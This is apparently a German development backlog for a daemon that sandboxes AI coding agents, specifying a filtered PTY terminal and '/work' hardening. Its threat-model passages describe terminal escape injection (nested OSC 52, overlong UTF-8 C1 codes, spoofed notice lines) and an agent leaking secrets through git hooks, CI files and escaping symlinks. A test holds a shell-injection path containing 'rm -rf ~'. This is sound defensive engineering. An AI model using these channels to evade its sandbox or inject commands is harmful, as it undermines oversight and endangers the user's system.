- [x] `close` und erneutes `Open` zeigen den Scrollback; ein zweiter Leser sieht dasselbe wie der Schreiber, kann aber nichts senden. Gemessen in `one_writer_many_readers` (`ipc/tests/terminal.rs`, am 2026-09-06 ausgeführt): Ein zweiter **Schreiber** bekommt `TERM_001` und sein Strom endet; ein Leser bekommt den Rückstand, sieht `GOT writer` und seine eigene Eingabe erscheint nie (`GOT reader` fehlt); nach `close` und erneutem Anschluss steht der Rückstand wieder da.
- [x] `humanitl sandbox attach --read-only` zeigt die laufende Sitzung. Gemessen am 2026-09-06 in `sandbox_attach_read_only_watches_and_sends_nothing` (`daemon/bin/humanitl/tests/cli.rs`) gegen einen Fake, der jedes empfangene Byte zurückwirft: Die Bytes des Daemons erscheinen, das Getippte nie. Mutationsprobe: Eingabe auch im lesenden Modus weiterreichen, Test rot — der erste Entwurf des Tests hat sie **nicht** bestanden, weil er `stdout` zweimal gegriffen hat und der zweite Griff leer war.

### Stand (2026-09-04): Größe XL, der Vertrag ist da und besser als die Spezifikation, der Rest ist ungebaut

Audit von 28 Agenten gegen den Code: 17 Widersprüche, 5 blockierend, oben im Text korrigiert. Gebaut ist der Vertrag (`proto/humanitl/v1/humanitl.proto`, Terminal-Nachrichten; Dart-Stub in `humanitl.pbgrpc.dart`; `DaemonApi::terminal` und `plain_stream` in `server_stub.rs`; `echo_terminal` im Fake), der Stub `IpcServer::terminal` mit `unimplemented("Terminal", "HUM-042")`, `TERM_001` im Register, `StdioMode { Inherit, Capture }` mit dem Hinweis auf dieses Issue, `supervise` als einziger Spawn-Punkt, `SandboxHandle` mit `kill_process_group`, `HoldQueue::subscribe()` und `FlowRegistry::get`, `sanitize_note`, `sandboxLogProvider` und `SandboxTab`. Ungebaut: PTY, Filter, Handler, `ui.terminal_notices`, `xterm2`, Bidi-Client, Pane, Kontextmenü, Palette, CLI-Hälfte, Escape-Fälle. Daher XL statt L.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- „Genau ein aktiver Client pro Session, zweiter Aufruf `Status::already_exists`" widersprach dem eigenen Sprint-Kopf und CONVENTIONS 4.10: ein Schreiber, beliebig viele Leser, `TERM_001` nur beim zweiten Schreiber, als `diagnostic`.
- Die Proto-Zeile beschrieb Nachrichten, die nie committet wurden (`Notice`, `detach`, `Exit.signal`); committet sind `Open{sandbox_id,cols,rows,read_only}`, `close`, `Exit{code}`, `Diagnostic`, `Resize` (beide Richtungen). `protoc-gen-dart` liegt hier nicht auf dem PATH; eine Proto-Änderung ließe `proto/generated.sha256` veralten und CI rot werden.
- `resize` per `TIOCSWINSZ` plus `SIGWINCH` an `child: Pid` erreicht den Agenten nicht: `--new-session` ist unbedingt (`bwrap_args.rs`, `profile.rs`), kein steuerndes Terminal, und die bwrap-PID ist das Init des Namensraums. Es gilt `tcsetwinsize` plus `kill_process_group(…, WINCH)`.
- `nix::pty::openpty` mit `fork`/`setsid`/`TIOCSCTTY`/`dup2` verlangt `unsafe` in einer Crate mit `#![forbid(unsafe_code)]`; `nix` ist in keinem Manifest. Es gilt `rustix` mit `pty`/`termios`, und die Deskriptoren kommen über `Stdio::from(OwnedFd)`.
- `PtySession::spawn` als zweiter Starter neben `SandboxBackend::launch` verlöre Report-Pipe, `--json-status-fd`, `kill`/`interrupt`/`terminate` und damit die Isolationsprüfung von HUM-041; außerdem ist `LaunchPlan` von außen nicht baubar. PTY ist ein `StdioMode`.
- Weiter korrigiert: kein `mpsc` vom Proxy (Bus existiert; Richtung wäre verboten); `[humanitl] request held` als nackte Zeile ist in einem Vollbild-TUI nicht sichtbar, deshalb der Streifen; `ui.terminal_notices` braucht `UiConfig` und `docs/CONFIG.md`; ARB-Schlüssel camelCase; `HTokens.terminalTheme` und ein Kontextmenü existieren nicht; ESC-5 schreibt die OSC-Fälle HUM-050 zu; „Der Daemon filtert, nicht die UI" ändert K-09 und braucht `docs/THREAT-MODEL.md` im selben Commit; Resize-Ordnung läuft über `Open`; `detach` bedeutete in HUM-067 das Gegenteil (dort jetzt gestrichen); der PTY-Test kann `LaunchPlan` nicht bauen; kein CLI-Subkommando genannt.

**Offen, hier nicht entschieden:** `--new-session` behalten (Empfehlung) oder nicht; `HContextMenu` in diesem Issue oder in dem, das es für HUM-030 liefert; die `rustix`-Versionszeile in `[workspace.dependencies]` (Elternagent). `docs/THREAT-MODEL.md:330` sagt heute „Das Terminal-Widget (`xterm2`) hat OSC 52, OSC 8 und das Setzen des Fenstertitels abgeschaltet"; das bleibt wahr und wird um den Daemon-Filter ergänzt, nicht ersetzt.

**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`); `sandbox_screen.dart`, `sandbox_status_provider.dart`, `domain/sandbox.dart` sind da, der Terminal-Bereich ist ein erklärter Platzhalter mit fester Aufteilung 60/40 (CONVENTIONS 4.17). Zeilenanker in der Proto sind um etwa 13 Zeilen gewandert (Terminal-Nachrichten heute ab Zeile 911).

**Aus dem Audit nicht bestätigt:** die Zeilenangabe `handle.rs:394-399` für den Kommentar zur Signalzustellung an das Namespace-Init (der Aufruf `kill_process_group(pid, Signal::INT)` in `interrupt` ist da, den Kommentartext hat die Suche nicht getroffen); die Aussage über `bwrap 0.12.0` auf dieser Maschine wurde nicht nachgemessen.

**Feindliche Eingabe:** drei Stellen. Erstens die Terminalbytes selbst (K-09): Filter im Daemon, kein OSC-Handler im Widget, Banner, Ringpuffer nur gefiltert. Zweitens, neu mit diesem Issue und die schärfste: die Hinweiszeile setzt Text des Agenten (`path_and_query`, roh) in eine Zeile mit Humanitl-Absender, und der Daemon schreibt sie selbst, also am Filter vorbei — ohne `sanitize_note`, Kürzung und Grenzeinfügung kann ein Pfad mit `\r`, `\x1b[2K` oder einem verschachtelten OSC 52 die echte Zeile löschen, `[humanitl] allowed` fälschen oder die Zwischenablage durch den Filter schieben, der es verhindern sollte. Drittens die Lesergrenze: `data` eines `read_only`-Clients wird im Handler verworfen, nicht im Client, und ist getestet (`reader_cannot_write`, `reader_resize_ignored`).

### Stand (2026-09-05): gebaut, mit vier Abweichungen von der Spezifikation

Gebaut sind PTY, Filter, Handler, `ui.terminal_notices`, `xterm2`, Bidi-Client,
Pane, Kontextmenü, Palette, CLI-Hälfte und die beiden Escape-Fälle. Die
dauerhaften Festlegungen stehen in `backlog/CONVENTIONS.md` 4.28; hier steht,
was gegenüber dem Text oben anders entschieden wurde und warum.

**1. Der Filter liegt im Kern, nicht in `humanitl-sandbox`, und heißt nicht
`osc_filter.rs`.** `backlog/CONVENTIONS.md` 4.26 verlangt, den vorhandenen
Filter zu erweitern statt einen zweiten zu bauen; ein zweiter hätte die
C1- und UTF-8-Behandlung ein zweites Mal gebraucht, und genau dort liefen sie
auseinander. `humanitl_core::terminal` hat deshalb jetzt zwei Politiken
(`TerminalPolicy::ColourOnly`, `TerminalPolicy::FullScreen`) und denselben
Zustandsautomaten. Er ist eine reine Funktion über Bytes und gehört damit in
den Kern (ARCHITECTURE 1); der einzige Aufrufer sitzt in `humanitl-ipc`, das
`humanitl-core` ohnehin sieht.

**2. `OscPolicy { deny: [...] }` ist eine Erlaubnisliste geworden.** Die
Sperrliste der Spezifikation (`0, 1, 2, 7, 8, 9, 52, 777, 1337`) hat Löcher,
und sie sind gemessen: OSC 99 (Benachrichtigung in kitty), OSC 12
(Cursorfarbe), OSC 50 (Schriftart) stehen nicht darauf, und jede Nummer, die
ein Terminal morgen belegt, wäre offen. Es gilt `OSC_ALLOWED = [4, 10, 11,
104, 110, 111, 133]`. Zusätzlich fallen zwei Dinge weg, die der Text nicht
nannte: `CSI … t` (XTWINOPS setzt und **liest** den Fenstertitel an OSC 0
vorbei) und jede Nutzlast einer erlaubten OSC-Folge, die ein Byte außerhalb
von `0x20..=0x7e` enthält — `OSC 4;1; ESC ] 52 ; …` schöbe sonst die
Zwischenablage-Folge an der Nummernprüfung vorbei. Der Test
`a_nested_sequence_inside_an_allowed_one_drops_both` hält das fest.

**3. Jede Sitzung läuft am PTY, auch die von `humanitl run`.** Der Vertrag hat
kein Feld, mit dem ein Client den Modus wählen könnte, und jede Ableitung aus
einem anderen Feld wäre eine zweite Bedeutung für dieses Feld. Folgen für
HUM-067, gemessen und nicht vermutet: ein Strom statt zwei (alles kommt als
`OutputStream::Stdout`), `\n` wird zu `\r\n`, und die Eingabe endet nicht mehr
von selbst — ein Agent, der von stdin liest, wartet, statt sofort zu enden.
Der Modulkommentar von `cmd/run.rs` ist entsprechend berichtigt. Die 84
Testbinaries des Workspace bleiben grün, `the_output_travels_filtered_and_the_
exit_code_behind_it` eingeschlossen.

**4. Die Hinweiszeile im Strom ist eine Bequemlichkeit, nicht die Zusage.** Der
Test `notice_is_sanitized` hat beim ersten Lauf einen Weg gefunden, den die
Spezifikation nicht kennt: Ein Pfad mit dem Text `[humanitl] request allowed:`
übersteht `sanitize_note` unverändert, denn er ist Text und kein Steuerzeichen.
Der Pfad wird deshalb zusätzlich um die eckige Klammer gebracht
(`path_for_notice`, `[` wird `(`), damit der Absender in der Zeile genau einmal
vorkommt. Weiter reicht es nicht: Der Agent kann dieselben Wörter jederzeit
selbst ausgeben. Deshalb hängt das Akzeptanzkriterium am Streifen über dem
Terminal, und `docs/SECURITY.md` 3.3 nennt die Restlücke.

**Was zusätzlich entstand:** `TERM_002` (Terminal nicht erreichbar),
`SandboxPorts::with_notices`, `PTY_MIRROR_BYTES` und der 2-KiB-Spiegel für
`Shared::verdict`, `HTerminalPalette` auf `HTokens`, `HContextMenu` mit
`HContextMenuController` (der Emulator braucht seinen Rechtsklick selbst),
`humanitl sandbox attach [--read-only]` und die beiden ESC-5-Fälle, die jetzt
über `daemon/crates/ipc/tests/terminal.rs` laufen.

**Zwei Fehler, die die Tests gefunden haben:** Der Fake-Client hing beim
Abmelden, weil ein `async*`-Erzeuger, der auf die nächste Nachricht wartet,
sich nicht abbrechen lässt — er hält erst am nächsten `yield`, und der kam
nie. Er ist jetzt geschoben und nicht gezogen. Und `TerminalSession::_detach`
wartet nicht mehr auf das Abmelden: Ein Daemon, der schweigt, hielte sonst die
Entsorgung des Providers und mit ihr den Bildschirm.

**Aus den beiden Reviews, alle behoben:**

- *Blockierend (Antigravity):* Überlange UTF-8-Kodierungen versteckten
  C1-Steuerzeichen. Der Filter zählte nur Folgebytes, und `E0 82 9B` ist
  `U+009B` (CSI), `C0 9B` sogar `U+001B`. Jetzt wird jedes Mehrbytezeichen
  zusammengehalten und auf die kürzeste Form geprüft; was durchfällt, fällt
  weg. Dabei fiel eine zweite Lücke auf: Eine mit einem C1-Byte eingeleitete
  CSI-Folge wurde in die erlaubte Sieben-Bit-Form übersetzt und weitergereicht
  — jetzt geht sie nie hinaus.
- *Blockierend (beide, Codex' Fassung übernommen):* Scheiterte
  `master.try_clone()` nach dem `spawn`, kehrte `supervise` zurück, ohne
  `bwrap` einzusammeln. Der Deskriptor wird jetzt in `open_pty` verdoppelt,
  also **vor** dem Start; zwischen `spawn` und der Warteschleife gibt es
  keinen Rückweg mehr. Die übrigen vier Rückkehrpunkte liegen alle vor dem
  `spawn`, geprüft.
- *Schwer (Codex):* `HeldNotices::run` überlebte seine Sitzung und hielt über
  den `TerminalHub` den `SandboxHandle` samt Pseudoterminal fest. `accompany`
  bricht die Aufgabe jetzt nach `stream_output` ab.
- *Klein (Codex):* `finish()` verlor einen Hinweis, der auf eine Grenze
  wartete. Er geht jetzt vor dem `Exit` hinaus.
- *Klein (Antigravity):* `TerminalView.readOnly` hing allein an der Phase; ein
  Leser sah einen Cursor, der auf Eingaben zu warten schien. `readOnly` steht
  jetzt im Sitzungszustand.

Eine Änderung an einer Zusicherung aus HUM-067 gehört dazu:
`a_lead_byte_does_not_smuggle_an_escape` erwartete für `C3 1B` noch das
Ersatzzeichen, weil das einzelne Anfangsbyte hinausging. Es geht jetzt nicht
mehr hinaus — ein halbes Zeichen ist kein Zeichen.

**Nicht gebaut:** der Integrationstest mit echtem Daemon aus Schritt 9
(`echo $TERM` ⇒ `xterm-256color`). Die Frage, ob der Agent an einem Terminal
steht, beantwortet `daemon/crates/sandbox/tests/pty.rs` (`test -t 0`, `stty
size`) an einer echten Sandbox; ein zweiter Weg über einen laufenden Daemon
hätte dieselbe Aussage mit mehr Aufbau geprüft. `TERM` selbst setzt der
Launcher heute nicht — das gehört zum Umgebungs-Kit des Agenten (HUM-014,
`sandbox.env`) und nicht zum Terminal.

### Fallstricke
- **`--new-session` und Signale:** kein steuerndes Terminal, also kein automatisches `SIGWINCH` und kein tty-`SIGINT`. Resize liefert der Daemon per `kill_process_group`, Ctrl+C ist Byte 0x03.
- **Resize-Race:** Geometrie kommt mit `Open` und wird vor dem Scrollback angewendet; im Client vor dem Öffnen des Streams die aktuelle Größe ermitteln.
- Der OSC-Filter darf UTF-8-Mehrbytezeichen nicht zerschneiden: er arbeitet auf Bytes und gibt nur ganze Sequenzen oder Rohbytes weiter; UTF-8-Dekodierung passiert erst in Flutter mit `allowMalformed`.
- `ESC \` (ST) besteht aus zwei Bytes, die über eine Chunk-Grenze fallen können. Der Zustandsautomat merkt sich das `ESC`.
- PTY-Master `read` liefert `EIO`, wenn das Kind beendet ist; das ist EOF, kein Fehler. Die eigene Kopie des Slaves nach dem Spawn schließen, sonst kommt das EOF nie.
- `Shared::verdict` liest `SANDBOX_003` aus aufgefangenem stderr; im PTY-Modus ist `capturing` falsch, deshalb der 2-KiB-Spiegel.
- Zombie-Vermeidung: `waitpid` bleibt in `supervise`, `SIGCHLD` nicht global ignorieren.
- xterm2 unter Impeller: Text-Rendering testen, bei Problemen `--no-enable-impeller` dokumentieren (BACKLOG.md 10).

### Referenzen
BACKLOG.md 4.2 (Terminal-Ausgabe), 4.5 ESC-5, Abschnitt 5; ADR-003, ADR-018; CONVENTIONS.md 3.6, 3.9, 4.10, 4.12, 4.17; `docs/THREAT-MODEL.md` K-09; `docs/ARCHITECTURE.md` 1.2, 3b. xterm2 (https://pub.dev/packages/xterm2), `pty(7)`, XTerm Control Sequences (OSC 52, OSC 8), `rustix::pty`, `rustix::termios`.

---

## HUM-043 · `/work`-Härtung
Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-011, HUM-025, HUM-026, HUM-040 · Blockiert: HUM-046, HUM-068 (Codes `SANDBOX_020..025`)

### Kontext
Sicherheitsreview, Kanal 1: `/work` mit Schreibrecht ist der größte Seitenkanal. Der Agent kann Secrets in `.git/hooks`, `.envrc`, `.vscode/settings.json` oder Workflow-Dateien schreiben, die der Nutzer später ausführt oder pusht. Symlinks aus `/work` nach außen werden host-seitig aufgelöst. Der Kanal wird nicht geschlossen, sondern deklariert und beobachtet: Maskierung, Diff-Zusammenfassung am Ende des Sandbox-Laufs, Secret-Scan über den Diff, Symlink-Erkennung.

### Ziel
Das Sandbox-Profil maskiert gefährliche Pfade in `/work`. Der Daemon nimmt beim Start eines Sandbox-Laufs einen Dateibaum-Snapshot (Pfad, Größe, mtime, SHA-256 für Dateien ≤ 4 MiB) und beim Ende des Laufs einen zweiten, berechnet den Diff, scannt neue und geänderte Textdateien mit den Findings-Detektoren, erkennt Symlinks mit Ziel außerhalb `/work`, und liefert eine `SessionSummary`, die im UI als Sheet und in der CLI als Tabelle erscheint. Host-seitige Dateizugriffe des Daemons in `/work` verwenden `openat2` mit `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`.

### Nicht-Ziel
Kein Git-Integration (kein `git diff`, keine Commits). Kein Blockieren von Schreibvorgängen zur Laufzeit (kein FUSE, kein inotify-basiertes Eingreifen). Keine Wiederherstellung. Kein `blake3`: `humanitl_core::sha256` liefert schon `[u8; 32]`, `sha2` ist Workspace-Abhängigkeit, und `docs/ARCHITECTURE.md` 7 zählt die zugelassene Kryptographie ohne `blake3` auf.

### Betroffene Pfade
Teil a, Maskierung und Profil:
- `profiles/sandbox/default.toml`: `tmpfs`, `masked_files` ergänzen (Liste unten); danach `UPDATE_ARGV_SNAPSHOT=1 cargo test -p humanitl-sandbox --test bwrap_args_snapshot` und den Diff von `daemon/crates/sandbox/tests/snapshots/default.argv.txt` Zeile für Zeile lesen
- `daemon/crates/sandbox/src/profile.rs`: `unmask` auf `MountSection` (`deny_unknown_fields`), wirkt in `effective_masked_files` nie auf `MANDATORY_MASKED_FILES`
- `daemon/crates/core-types/src/diagnostics/codes.rs`: `SANDBOX_020..025` ans Ende anhängen (geteilte Datei: vor dem Schreiben neu lesen), danach `UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`
- `docs/SECURITY.md` (Zeilen zu `.envrc`/`.git/config` in Abschnitt 2 und im Kanal-Abschnitt): `--ro-bind-data` statt `/dev/null`, neue Liste; im selben Commit (CLAUDE.md)
- `tests/escape/esc-5-filesystem.sh`: `symlink_out_of_work_is_marked`, `masked_path_stays_masked` von `skip` auf echte Prüfung, dritter Fall `hooks_write_stays_in_sandbox`; die übrigen vier bleiben `skip` (HUM-042 für die OSC-Fälle, HUM-029 für Audit). HUM-042 bearbeitet dieselbe Datei.

Teil b, Snapshot, Summary, RPC, CLI, UI:
- `daemon/crates/sandbox/src/worktree.rs` (neu): Snapshot, Diff, Symlink-Check, Safe-Open; nur `humanitl-core` und `humanitl-config` (`tools/deps-allow.toml`)
- `daemon/crates/findings/src/registry.rs`: `DetectorRegistry::scan_bytes(&self, location: FindingLocation, bytes: &[u8]) -> ScanReport` (heute nur `scan(&HttpRequest, &[u8])`), `WorkflowDetector`
- `daemon/crates/core-types/src/finding.rs`: `FindingLocation::File(PathBuf)`; nachziehen: Sortierschlüssel in `registry.rs`, Proto-Enum `FindingLocation` plus Pfad-Feld in `message Finding` (heute trägt nur `header_name` einen Parameter), Spaltenkommentar `findings.location` in `V1__init.sql`, `app/lib/core/domain/flow.dart`, `app/lib/core/ipc/convert.dart`
- `daemon/crates/ipc/src/sandbox.rs`, `daemon/crates/ipc/src/summary.rs` (neu): Orchestrierung (Snapshot vor `launch`, Wach-Task auf den `SandboxHandle`, zweiter Snapshot, Scan, Summary in den Recorder, Ereignis); `daemon/crates/ipc/Cargo.toml` bekommt `humanitl-findings` (erlaubt, aber nicht eingetragen)
- `daemon/crates/recorder/migrations/V5__session_summary.sql` (neu), Eintrag hinter V4 in `daemon/crates/recorder/src/schema.rs` (`migrations_are_numbered_without_gaps` erzwingt `version == index + 1`), Schreib- und Lesepfad
- `proto/humanitl/v1/humanitl.proto`: `SessionSummary { repeated FileChange changes; repeated Finding findings; repeated SymlinkEscape symlinks; uint64 scanned_bytes; bool truncated }`, `FileChange`, `SymlinkEscape`, sechster Arm `SessionSummary summary = 6;` in `SandboxEvent.event`, `rpc GetSessionSummary(SessionRef) returns (SessionSummary)`; `scripts/gen-proto.sh`, `proto/generated.sha256`
- `daemon/bin/humanitl/src/cli.rs`: `Cmd::Sessions`; `daemon/bin/humanitl/src/cmd/sessions.rs` (neu): `humanitl sessions summary <id> [--json]` (nicht `cmd/flows.rs`; Ergänzung zu CONVENTIONS 3.8)
- `app/lib/features/sandbox/widgets/session_summary_sheet.dart` (neu), auf `h_sheet.dart` nach dem Vorbild `argv_sheet.dart`; `app/l10n/app_en.arb`, `app_de.arb`

### Spezifikation

Maskierungsliste (Profil `default.toml`; heute stehen dort `tmpfs = ["/tmp", "/var/tmp", "/dev/shm", "/home/agent", "/work/.git/hooks", "/work/.vscode", "/work/.idea"]` und `masked_files = ["/work/.envrc", "/work/.git/config"]`, alles davon bleibt):

```toml
[mounts]
tmpfs = [
  "/tmp", "/var/tmp", "/dev/shm", "/home/agent",
  "/work/.git/hooks",
  "/work/.vscode", "/work/.idea", "/work/.fleet",
  "/work/.github/workflows",
  "/work/.gitlab-ci.yml.d",
  "/work/.direnv",
  "/work/.humanitl",
]
masked_files = [
  "/work/.envrc", "/work/.env", "/work/.env.local",
  "/work/.git/config",
  "/work/.npmrc", "/work/.yarnrc", "/work/.yarnrc.yml", "/work/.pypirc",
  "/work/.gitlab-ci.yml", "/work/Jenkinsfile", "/work/.pre-commit-config.yaml",
]
```

`/var/tmp` fehlte in der „vollständigen" Liste der ersten Fassung und wäre wörtlich übernommen verloren gegangen. `/work/.humanitl` verlangt `backlog/sprint-4.md` (HUM-069, Test `sandbox_masks_dot_humanitl`): sonst schreibt der Agent sein eigenes Projekt-Profil. `.direnv` ist ein Verzeichnis und gehört nach `tmpfs`; eine Maske greift nur auf `is_file()`.

`masked_files` werden als versiegeltes, leeres memfd per `--ro-bind-data` über den Originalpfad gelegt (`bwrap_args.rs`; nicht `/dev/null`: der Bind eines Gerätes auf einem `nodev`-Mount antwortet `EACCES`). Maske und `tmpfs` werden nur gerendert, wenn der Pfad selbst existiert (`BwrapBackend::present_under_work`: `is_file()` für Masken, `is_dir()` für tmpfs), nicht schon, wenn das Elternverzeichnis existiert — bwrap legt fehlende Mountpoints an, auf `rw` entstünde ein leeres `.idea/` im Projekt des Nutzers, auf `ro` scheitert der Start mit `EROFS`. **Die Lücke, die daraus folgt, entscheidet dieses Issue:** Ohne `.git/hooks` auf dem Host gibt es kein tmpfs, und der `pre-commit` des Agenten landet auf dem Host. Zwei Wege stehen zur Wahl, einer ist zu nehmen und hier einzutragen: der Daemon legt die Verzeichnisse vor dem Start ausdrücklich an (nur bei `work_mode = rw`, protokolliert), oder die Summary meldet die ungeschützten Pfade als Befund.

`/work/.envrc` und `/work/.git/config` sind `MANDATORY_MASKED_FILES` (`profile.rs`, Test `masked_files_always_include_the_mandatory_ones`). `unmask` wirkt nie auf sie; ein Versuch ist `CONFIG_003`. Sonst fiele eine deklarierte Seitenkanal-Sperre (AGENTS.md, Kanal 1). Wo `unmask` wohnt, ist zu entscheiden: als Profilschlüssel `mounts.unmask` (dann kein Tier; Tiers sind Anmerkungen am Konfigurationsschema, nicht am Sandbox-Profil) oder als Konfigurationsschlüssel `sandbox.unmask` mit `x-tier = "expert"` und `x-project-scope = "denied"` (dann entsteht die Kommandozeilen-Fahne von selbst und `docs/CONFIG.md` wächst mit). Diagnostic `SANDBOX_020` (Warning) beim Start: "You unmasked {path}. The agent can read and write it."

Snapshot (`worktree.rs`):

```rust
pub struct TreeSnapshot { entries: BTreeMap<PathBuf, Entry>, truncated: bool }   // Pfade relativ zu /work
pub struct Entry { kind: Kind /* File|Dir|Symlink{target}|Other */, size: u64, mtime_ns: i128, mode: u32, hash: Option<[u8;32]> }
pub fn snapshot(root: &Path, limits: &SnapshotLimits) -> Result<TreeSnapshot, Diagnostic>;
pub struct SnapshotLimits {
    pub max_entries: usize,                 /* 200_000 */
    pub hash_max_bytes: u64,                /* 4 MiB */
    pub skip_names: Vec<&'static str>,      /* node_modules, target, .venv, __pycache__, .cache */
    pub skip_paths: Vec<&'static str>,      /* .git/objects */
}
pub fn diff(before: &TreeSnapshot, after: &TreeSnapshot) -> Vec<FileChange>;
pub enum FileChange { Added(PathBuf), Modified(PathBuf), Removed(PathBuf), SymlinkAdded { path: PathBuf, target: PathBuf, escapes: bool }, ModeChanged(PathBuf) }
```

`mode` steht in `Entry`, sonst wäre `ModeChanged` nicht berechenbar. Zwei Listen statt einer: eine Liste bloßer Namen kann `.git/objects` nicht ausdrücken, ohne jedes `objects/` im Baum zu überspringen. `RelPath` gibt es im Baum nicht; `PathBuf` relativ zum Root. Hash ist `humanitl_core::sha256` (`http.rs`).

Der Walk verwendet `rustix::fs::openat2(dirfd, name, OFlags::PATH | OFlags::NOFOLLOW | OFlags::CLOEXEC, Mode::empty(), ResolveFlags::BENEATH | ResolveFlags::NO_SYMLINKS | ResolveFlags::NO_MAGICLINKS)` relativ zum Root-FD von `/work` (Host-Pfad); `rustix = { version = "1.1", features = ["fs", "process"] }` ist schon direkte Abhängigkeit der Crate, `nix` nicht im Baum. Symlinks werden per `readlinkat` gelesen, nie gefolgt. `escapes = true`, wenn `target` absolut ist oder nach lexikalischer Normalisierung mit `..` aus `/work` hinausführt; das Ziel wird dafür nie aufgelöst. Kernel < 5.6 (kein `openat2`, `Errno::NOSYS`): Fallback `openat` mit `O_NOFOLLOW` je Komponente, Diagnostic `SANDBOX_021` (Info). Merken: `openat2` hängt in rustix an `linux_raw`; wer `use-libc` einschaltet, verliert es.

`.git/objects` wird übersprungen (groß, opak), `.git/HEAD`, `.git/refs/**`, `.git/config` (maskiert, also unverändert), `.git/hooks` (tmpfs, also unverändert) werden erfasst. Budgets nach dem Muster von `SOCKET_WALK_MAX_ENTRIES` (`profile.rs`): Symlink-Schleifen und tiefe Bäume enden im `truncated`-Flag mit `SANDBOX_024`, nie in einem hängenden Daemon.

Scan: Für `Added`/`Modified` Dateien ≤ 4 MiB, deren erste 8 KiB kein NUL-Byte enthalten (Text-Heuristik), läuft `DetectorRegistry::scan_bytes(FindingLocation::File(path), bytes)`. Zusätzlicher Detektor `WorkflowDetector` (`Detector`-Trait in `registry.rs`, nur Pfadmuster, kein IO): Pfad matcht `.github/workflows/**`, `.gitlab-ci.yml`, `Makefile`, `package.json` (nur Schlüssel `scripts.postinstall|preinstall|prepare`), `setup.py`, `pyproject.toml` (`[tool.*.scripts]`), `Cargo.toml` (`build`) ⇒ `FindingKind::Custom("executable-on-host")`, Tier `Regex`. Diese Findings werden nicht geblockt, sondern gelistet. Die Zeile eines Fundes rechnet der Daemon (`\n` bis `span.start`; `Finding.span` ist ein Byte-Bereich) und legt sie als `line: u32` in die Summary; die Oberfläche hat die Datei nicht.

`SessionSummary` gehört zum **Sandbox-Lauf**, nicht zur Daemon-Sitzung: `humanitld` hat genau eine `SessionId` je Prozess (`main.rs`, `start_session` beim Start, `end_session` beim Herunterfahren), die Sandbox startet und stoppt darin beliebig oft (`SandboxService::start`/`stop`), und `/work` steht erst mit `SandboxRequest.Start.work_dir` fest. Tabelle `session_summaries(session_id, run_id, created, json BLOB, PRIMARY KEY(session_id, run_id))` mit einer eigenen Lauf-Kennung, die dieses Issue einführt. „Session-Ende" heißt überall in diesem Issue „`SandboxHandle` beendet". Ein Wach-Task in `SandboxService` wartet auf das Handle, zieht den zweiten Snapshot und sendet `SandboxEvent.summary` — heute bemerkt der Dienst das Ende des Agenten nur, wenn ein Client nach dem Status fragt (`try_wait()` in `running_facts`). Der RPC `GetSessionSummary` liefert eine gespeicherte Summary nach Kennung; kein vorhandener RPC kann das, und `Sandbox` ist ein Strom über die laufende Sandbox.

UI: Sheet von rechts, Titel „Session summary", drei Abschnitte: Changed files (Tabelle Pfad, Art, Größe), Findings (Chips nach Typ, Klick zeigt Datei und Zeile aus der Summary), Symlinks (rot, wenn `escapes`). Buttons: „Open folder" über `org.freedesktop.FileManager1.ShowFolders` per vorhandener `dbus`-Abhängigkeit (kein `url_launcher`, kein `Process.run` in `app/lib`) auf den Host-Pfad aus `sandbox.work_dir`, nie auf einen Pfad aus der Summary; „Copy list". CLI: `humanitl sessions summary <id> [--json]`; jeder Pfad und jedes Symlink-Ziel läuft vor Tabelle, Diagnostic und JSON durch `humanitl_core::block::sanitize_note` (`render.rs::one_line` lässt ESC, OSC und Bidi stehen).

Diagnostics (`SANDBOX_020..025`, Bereich reicht bis 029, höchster vergebener Code war `SANDBOX_016`): `SANDBOX_022` (Warning) pro Symlink mit `escapes`: "The agent created a symlink {path} pointing outside the project ({target}). Do not follow it." `fix: CopyCommand(…)` nur, wenn `shlex::try_quote` den Host-Pfad verlustfrei quotieren kann, sonst kein `CopyCommand`, nur Anzeige — es wäre der erste `CopyCommand` im Baum aus fremden Bytes, und ein Pfad mit `'` bricht aus der Quotierung aus. `SANDBOX_023` (Warning) bei Findings in geänderten Dateien: "{n} potential secret(s) were written into the project during this session." `SANDBOX_024` (Info) bei `truncated`. `SANDBOX_025` (Warning) kam mit dem Stand vom 2026-09-05 dazu: eine Änderung unter einem Pfad, den das Profil überdeckt, den es aber im Projekt nicht gab.

### Schritte
1. Teil a: Profil-Liste ergänzen, Argv-Snapshot erneuern und lesen; `unmask` mit `CONFIG_003`-Sperre für Pflichtmasken; die Existenzlücke (`.git/hooks` fehlt) entscheiden und umsetzen; `SANDBOX_020..025` registrieren; `docs/SECURITY.md` nachziehen; ESC-5-Fälle. Eigener Commit.
2. Teil b: `worktree.rs` mit `openat2`, Fallback, Snapshot, Diff, Budgets; tabellengetriebene Tests mit `tempfile`.
3. `FindingLocation::File`, `scan_bytes`, `WorkflowDetector`, die fünf abhängigen Stellen.
4. Lauf-Kennung, Wach-Task, `summary.rs`, Migration V5, Proto (sechster Arm, drei Nachrichten, RPC), Codegen.
5. `Cmd::Sessions`, `cmd/sessions.rs`.
6. Flutter-Sheet, ARB (geteilte Dateien: neu lesen, anhängen).

### Tests
- `snapshot_skips_node_modules_and_git_objects`.
- `diff_detects_added_modified_removed`, `diff_detects_mode_change`.
- `symlink_escape_absolute`, `symlink_escape_dotdot`, `symlink_inside_ok`.
- `openat2_refuses_symlink_traversal`: Baum mit `a -> /etc`; Öffnen von `a/passwd` schlägt mit `EXDEV`/`ELOOP` fehl.
- `masked_envrc_is_empty_in_sandbox`, `hooks_dir_is_tmpfs`: Integration mit bwrap.
- `unmask_never_touches_mandatory_masks` neben `masked_files_always_include_the_mandatory_ones`.
- `findings_in_added_file`: neue Datei mit `AKIA...`-Muster (zur Laufzeit aus zwei Teilen zusammengesetzt, CONVENTIONS 4.13) ⇒ `SANDBOX_023`.
- `workflow_detector_flags_github_workflow`.
- `copy_command_is_shell_safe`: Pfad `a'; rm -rf ~; '` ergibt keinen `CopyCommand`.
- Benchmark mit `#[ignore]` nach dem Vorbild `daemon/crates/recorder/tests/list_flows_scale.rs`.

### Akzeptanzkriterien
- [x] ESC-5: `symlink_out_of_work_is_marked`, `masked_path_stays_masked`, `hooks_write_stays_in_sandbox` grün; die vier fremden Fälle bleiben `skip`.
